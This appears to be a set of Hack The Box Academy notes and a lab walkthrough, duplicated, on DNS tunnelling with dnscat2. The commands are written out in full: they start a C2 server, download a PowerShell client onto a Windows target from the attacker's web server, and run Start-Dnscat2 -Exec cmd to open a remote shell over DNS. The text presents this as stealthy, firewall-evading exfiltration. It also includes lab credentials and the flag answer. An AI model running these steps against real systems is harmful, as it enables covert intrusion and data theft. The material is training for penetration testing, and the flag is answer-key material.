# 0) Be in the server dir (you already are)
cd ~/dnscat2/server

# 1) Toolchain + Ruby headers (needed to compile native gems)
sudo apt update
sudo apt install -y ruby-full ruby-dev build-essential

# 2) Bundler
sudo gem install bundler

# 3) Install the project’s gems (into a local vendor dir so sudo can see them)
bundle config set --local path 'vendor/bundle'
sudo bundle install

# (If you still see ecdsa missing, install it explicitly)
# sudo gem install ecdsa

# 4) Run dnscat2 via Bundler so it uses the gems we just installed
sudo bundle exec ruby ./dnscat2.rb --dns host=10.10.15.177,port=53,domain=inlanefreight.local --no-cache

---

[Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol. Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.

---

## Setting Up & Using dnscat2

If dnscat2 is not already set up on our attack host, we can do so using the following commands:

#### Cloning dnscat2 and Setting Up the Server

  DNS Tunneling with Dnscat2

```shell-session
xF1NN@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

We can then start the dnscat2 server by executing the dnscat2 file.

#### Starting the dnscat2 server

  DNS Tunneling with Dnscat2

```shell-session
xF1NN@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.
```

After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. We can use the client with the dnscat2 project or use [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell), a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server. We can clone the project containing the client file to our attack host, then transfer it to the target.

#### Cloning dnscat2-powershell to the Attack Host

  DNS Tunneling with Dnscat2

```shell-session
xF1NN@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Once the `dnscat2.ps1` file is on the target we can import it and run associated cmd-lets.

#### Importing dnscat2.ps1

  DNS Tunneling with Dnscat2

```powershell-session
PS C:\htb> Import-Module .\dnscat2.ps1
```

After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.

  DNS Tunneling with Dnscat2

```powershell-session
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

We must use the pre-shared secret (`-PreSharedSecret`) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.

#### Confirming Session Establishment

  DNS Tunneling with Dnscat2

```shell-session
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```

We can list the options we have with dnscat2 by entering `?` at the prompt.

#### Listing dnscat2 Options

  DNS Tunneling with Dnscat2

```shell-session
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```

We can use dnscat2 to interact with sessions and move further in a target environment on engagements. We will not cover all possibilities with dnscat2 in this module, but it is strongly encouraged to practice with it and maybe even find creative ways to use it on an engagement. Let's interact with our established session and drop into a shell.

#### Interacting with the Established Session

  DNS Tunneling with Dnscat2

```shell-session
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```

----
# DNS Tunneling with Dnscat2

## Question 1

### "Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer"

On `Pwnbox`/`PMVPN`, students need to clone the `dnscat2` repository and compile/install the server:

Code: shell

```shell
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
gem install bundler
bundle install
```

  DNS Tunneling with Dnscat2

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ git clone https://github.com/iagox86/dnscat2.git

Cloning into 'dnscat2'...
remote: Enumerating objects: 6617, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 6617 (delta 0), reused 2 (delta 0), pack-reused 6607
Receiving objects: 100% (6617/6617), 3.84 MiB | 6.13 MiB/s, done.
Resolving deltas: 100% (4564/4564), done.
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cd dnscat2/server/
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~/dnscat2/server]
└──╼ [★]$ sudo gem install bundler
Fetching bundler-2.3.21.gem
Successfully installed bundler-2.3.21
Parsing documentation for bundler-2.3.21
Installing ri documentation for bundler-2.3.21
Done installing documentation for bundler after 0 seconds
1 gem installed
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~/dnscat2/server]
└──╼ [★]$ bundle install

Fetching gem metadata from https://rubygems.org/.......
Using bundler 2.3.21
Following files may not be writable, so sudo is needed:
  /usr/local/bin
  /var/lib/gems/2.7.0
  /var/lib/gems/2.7.0/build_info
  /var/lib/gems/2.7.0/cache
  /var/lib/gems/2.7.0/doc
  /var/lib/gems/2.7.0/extensions
  /var/lib/gems/2.7.0/gems
  /var/lib/gems/2.7.0/plugins
  /var/lib/gems/2.7.0/specifications
Fetching ecdsa 1.2.0
Fetching salsa20 0.1.1
Fetching sha3 1.0.1
Fetching trollop 2.1.2
Installing salsa20 0.1.1 with native extensions
Installing trollop 2.1.2
Installing ecdsa 1.2.0
Installing sha3 1.0.1 with native extensions
Bundle complete! 4 Gemfile dependencies, 5 gems now installed.
Use `bundle info [gemname]` to see where a bundled gem is installed.
```

Subsequently, students need to start the `dnscat2` server from `Pwnbox`/`PMVPN`:

Code: shell

```shell
sudo ruby dnscat2.rb --dns host=PWNIP,port=53,domain=inlanefreight.local --no-cache
```

  DNS Tunneling with Dnscat2

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~/dnscat2/server]
└──╼ [★]$ sudo ruby dnscat2.rb --dns host=10.10.14.27,port=53,domain=inlanefreight.local --no-cache

New window created: 0
New window created: crypto-debug
dnscat2> Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.27:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=02c5d1724e0e97a2232bc2b53018921e inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=02c5d1724e0e97a2232bc2b53018921e

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.
```

Thereafter, from Pwnbox/`PMVPN`, students need to clone the `dnscat2-powershell` client, which will be used from the client-side (i.e., the Windows target):

Code: shell

```shell
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

  DNS Tunneling with Dnscat2

```shell-session
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ git clone https://github.com/lukebaggett/dnscat2-powershell.

Cloning into 'dnscat2-powershell'...
remote: Enumerating objects: 191, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 191 (delta 0), reused 2 (delta 0), pack-reused 188
Receiving objects: 100% (191/191), 1.26 MiB | 11.35 MiB/s, done.
Resolving deltas: 100% (59/59), done.
```

Students then need to connect to the spawned Windows target using `xfreerdp`, utilizing the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

  DNS Tunneling with Dnscat2

```shell-session
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~/dnscat2/server]
└──╼ [★]$ xfreerdp /v:10.129.114.66 /u:htb-student /p:HTB_@cademy_stdnt!

[14:03:32:877] [2798:2799] [INFO][com.freerdp.core] -freerdp_connect:freerdp_set_last_error_ex resetting error state

<SNIP>

Certificate details for 10.129.114.66:3389 (RDP-Server):
	Common Name: OFFICEMANAGER
	Subject:     CN = OFFICEMANAGER
	Issuer:      CN = OFFICEMANAGER
	Thumbprint:  a0:7a:87:4f:ed:ba:79:8f:54:df:d1:6b:29:64:4e:43:ad:9e:f4:b5:78:60:fa:4d:18:da:68:2e:97:5a:10:9e
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y

<SNIP>
```

![PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_18.png](https://academy.hackthebox.com/storage/walkthroughs/52/PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_18.png)

Subsequently, students need to transfer `dnscat2-powershell` to the spawned Windows target using any file transfer technique (including dragging and dropping the file). To transfer the file, students can start a Python3 web server on `Pwnbox`/`PMVPN` where the folder `dnscat2-powershell` is:

Code: shell

```shell
python3 -m http.server PWNPO
```

  DNS Tunneling with Dnscat2

```shell-session
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ python3 -m http.server 9001

Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
```

Then, using `PowerShell` (run as administrator) from the Windows spawned target, students can download the file using the `.NET` `WebClient`:

Code: shell

```shell
(New-Object Net.WebClient).DownloadFile('http://PWNIP:PWNPO/dnscat2-powershell/dnscat2.ps1', 'dnscat2.ps1')
```

  DNS Tunneling with Dnscat2

```powershell-session
PS C:\Windows\system32> (New-Object Net.WebClient).DownloadFile('http://10.10.14.17:9001/dnscat2-powershell/dnscat2.ps1', 'dnscat2.ps1')
```

After successfully downloading the `dnscat2.ps1` file, students need to import it as a module:

Code: powershell

```powershell
Import-Module .\dnscat2.ps1
```

  DNS Tunneling with Dnscat2

```powershell-session
PS C:\Windows\system32> Import-Module .\dnscat2.ps1
```

Subsequently, to attain a shell on the attacking host, students need to use `dnscat2` as a client to establish connectivity with the `dnscat2` server that was started on `Pwnbox`/`PMVPN` (students need to make sure that the pre-shared secret supplied to the `-PreSharedSecret` option is the one that was generated by `dnscat2.rub` on `Pwnbox`/`PMVPN`):

Code: powershell

```powershell
Start-Dnscat2 -DNSServer PWNIP -Domain inlanefreight.local -PreSharedSecret ac8cddd0b8161f2672390f95f8089317 -Exec cmd
```

  DNS Tunneling with Dnscat2

```powershell-session
PS C:\Windows\system32> Start-Dnscat2 -DNSServer 10.10.14.17 -Domain inlanefreight.local -PreSharedSecret ac8cddd0b8161f2672390f95f8089317 -Exec cmd
```

Students will notice that a new session will be opened/received on the `dnscat2` server run on `Pwnbox`/`PMVPN`:

  DNS Tunneling with Dnscat2

```shell-session
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
```

At last, students need to drop into a shell with the `window` command and print out the contents flag file "flag.txt" under the `C:\Users\htb-student\Documents\` directory, to attain `AC@tinth3Tunnel`:

Code: cmd

```cmd
window -i 1
type C:\Users\htb-student\Documents\flag.txt
```

  DNS Tunneling with Dnscat2

```cmd-session
window -i 1
New window created: 1

<SNIP>

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1> type C:\Users\htb-student\Documents\flag.txt
AC@tinth3Tunnel
```

Answer: {hidden}

---
# DNS Tunneling with Dnscat2

## Question 1

### "Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer"

On `Pwnbox`/`PMVPN`, students need to clone the `dnscat2` repository and compile/install the server:

Code: shell

```shell
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
gem install bundler
bundle install
```

  DNS Tunneling with Dnscat2

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ git clone https://github.com/iagox86/dnscat2.git

Cloning into 'dnscat2'...
remote: Enumerating objects: 6617, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 6617 (delta 0), reused 2 (delta 0), pack-reused 6607
Receiving objects: 100% (6617/6617), 3.84 MiB | 6.13 MiB/s, done.
Resolving deltas: 100% (4564/4564), done.
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cd dnscat2/server/
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~/dnscat2/server]
└──╼ [★]$ sudo gem install bundler
Fetching bundler-2.3.21.gem
Successfully installed bundler-2.3.21
Parsing documentation for bundler-2.3.21
Installing ri documentation for bundler-2.3.21
Done installing documentation for bundler after 0 seconds
1 gem installed
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~/dnscat2/server]
└──╼ [★]$ bundle install

Fetching gem metadata from https://rubygems.org/.......
Using bundler 2.3.21
Following files may not be writable, so sudo is needed:
  /usr/local/bin
  /var/lib/gems/2.7.0
  /var/lib/gems/2.7.0/build_info
  /var/lib/gems/2.7.0/cache
  /var/lib/gems/2.7.0/doc
  /var/lib/gems/2.7.0/extensions
  /var/lib/gems/2.7.0/gems
  /var/lib/gems/2.7.0/plugins
  /var/lib/gems/2.7.0/specifications
Fetching ecdsa 1.2.0
Fetching salsa20 0.1.1
Fetching sha3 1.0.1
Fetching trollop 2.1.2
Installing salsa20 0.1.1 with native extensions
Installing trollop 2.1.2
Installing ecdsa 1.2.0
Installing sha3 1.0.1 with native extensions
Bundle complete! 4 Gemfile dependencies, 5 gems now installed.
Use `bundle info [gemname]` to see where a bundled gem is installed.
```

Subsequently, students need to start the `dnscat2` server from `Pwnbox`/`PMVPN`:

Code: shell

```shell
sudo ruby dnscat2.rb --dns host=PWNIP,port=53,domain=inlanefreight.local --no-cache
```

  DNS Tunneling with Dnscat2

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~/dnscat2/server]
└──╼ [★]$ sudo ruby dnscat2.rb --dns host=10.10.14.27,port=53,domain=inlanefreight.local --no-cache

New window created: 0
New window created: crypto-debug
dnscat2> Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.27:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=02c5d1724e0e97a2232bc2b53018921e inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=02c5d1724e0e97a2232bc2b53018921e

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.
```

Thereafter, from Pwnbox/`PMVPN`, students need to clone the `dnscat2-powershell` client, which will be used from the client-side (i.e., the Windows target):

Code: shell

```shell
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

  DNS Tunneling with Dnscat2

```shell-session
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ git clone https://github.com/lukebaggett/dnscat2-powershell.

Cloning into 'dnscat2-powershell'...
remote: Enumerating objects: 191, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 191 (delta 0), reused 2 (delta 0), pack-reused 188
Receiving objects: 100% (191/191), 1.26 MiB | 11.35 MiB/s, done.
Resolving deltas: 100% (59/59), done.
```

Students then need to connect to the spawned Windows target using `xfreerdp`, utilizing the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

  DNS Tunneling with Dnscat2

```shell-session
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~/dnscat2/server]
└──╼ [★]$ xfreerdp /v:10.129.114.66 /u:htb-student /p:HTB_@cademy_stdnt!

[14:03:32:877] [2798:2799] [INFO][com.freerdp.core] -freerdp_connect:freerdp_set_last_error_ex resetting error state

<SNIP>

Certificate details for 10.129.114.66:3389 (RDP-Server):
	Common Name: OFFICEMANAGER
	Subject:     CN = OFFICEMANAGER
	Issuer:      CN = OFFICEMANAGER
	Thumbprint:  a0:7a:87:4f:ed:ba:79:8f:54:df:d1:6b:29:64:4e:43:ad:9e:f4:b5:78:60:fa:4d:18:da:68:2e:97:5a:10:9e
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y

<SNIP>
```

![PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_18.png](https://academy.hackthebox.com/storage/walkthroughs/52/PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_18.png)

Subsequently, students need to transfer `dnscat2-powershell` to the spawned Windows target using any file transfer technique (including dragging and dropping the file). To transfer the file, students can start a Python3 web server on `Pwnbox`/`PMVPN` where the folder `dnscat2-powershell` is:

Code: shell

```shell
python3 -m http.server PWNPO
```

  DNS Tunneling with Dnscat2

```shell-session
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ python3 -m http.server 9001

Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
```

Then, using `PowerShell` (run as administrator) from the Windows spawned target, students can download the file using the `.NET` `WebClient`:

Code: shell

```shell
(New-Object Net.WebClient).DownloadFile('http://PWNIP:PWNPO/dnscat2-powershell/dnscat2.ps1', 'dnscat2.ps1')
```

  DNS Tunneling with Dnscat2

```powershell-session
PS C:\Windows\system32> (New-Object Net.WebClient).DownloadFile('http://10.10.14.17:9001/dnscat2-powershell/dnscat2.ps1', 'dnscat2.ps1')
```

After successfully downloading the `dnscat2.ps1` file, students need to import it as a module:

Code: powershell

```powershell
Import-Module .\dnscat2.ps1
```

  DNS Tunneling with Dnscat2

```powershell-session
PS C:\Windows\system32> Import-Module .\dnscat2.ps1
```

Subsequently, to attain a shell on the attacking host, students need to use `dnscat2` as a client to establish connectivity with the `dnscat2` server that was started on `Pwnbox`/`PMVPN` (students need to make sure that the pre-shared secret supplied to the `-PreSharedSecret` option is the one that was generated by `dnscat2.rub` on `Pwnbox`/`PMVPN`):

Code: powershell

```powershell
Start-Dnscat2 -DNSServer PWNIP -Domain inlanefreight.local -PreSharedSecret ac8cddd0b8161f2672390f95f8089317 -Exec cmd
```

  DNS Tunneling with Dnscat2

```powershell-session
PS C:\Windows\system32> Start-Dnscat2 -DNSServer 10.10.14.17 -Domain inlanefreight.local -PreSharedSecret ac8cddd0b8161f2672390f95f8089317 -Exec cmd
```

Students will notice that a new session will be opened/received on the `dnscat2` server run on `Pwnbox`/`PMVPN`:

  DNS Tunneling with Dnscat2

```shell-session
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
```

At last, students need to drop into a shell with the `window` command and print out the contents flag file "flag.txt" under the `C:\Users\htb-student\Documents\` directory, to attain `AC@tinth3Tunnel`:

Code: cmd

```cmd
window -i 1
type C:\Users\htb-student\Documents\flag.txt
```

  DNS Tunneling with Dnscat2

```cmd-session
window -i 1
New window created: 1

<SNIP>

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1> type C:\Users\htb-student\Documents\flag.txt
AC@tinth3Tunnel
```

Answer: {hidden}